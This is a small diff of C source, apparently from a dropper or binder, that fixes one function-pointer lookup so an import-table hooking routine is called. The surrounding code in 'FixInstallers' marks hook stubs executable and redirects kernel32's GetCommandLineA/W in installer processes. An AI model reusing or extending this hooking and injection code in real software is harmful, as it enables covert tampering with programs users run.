@@ -131,6 +131,9 @@ typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip, u
 typedef void (*HFF5)(PCHAR, DWORD, LPSTARTUPINFO, LPPROCESS_INFORMATION);
 typedef DWORD (*HOOKIAT)(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData);
 
+
+
+
 // CRT DEI POVERI
 __forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
 {
@@ -436,7 +439,7 @@ __forceinline VOID FixInstallers(PMY_DATA pData)
 			pData->VirtualProtect(pfn_GetCommandLineAHook, pData->header->functions.GetCommandLineAHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);
 			pData->VirtualProtect(pfn_GetCommandLineWHook, pData->header->functions.GetCommandLineWHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);
 
-			HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)pData->header) + pData->header->functions.hookCall.offset);
+			HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)pData->header) + pData->header->functions.hookIAT.offset);
 
 			pfn_HookIAT(strKernel32, 
 				strGetCommandLineA, 
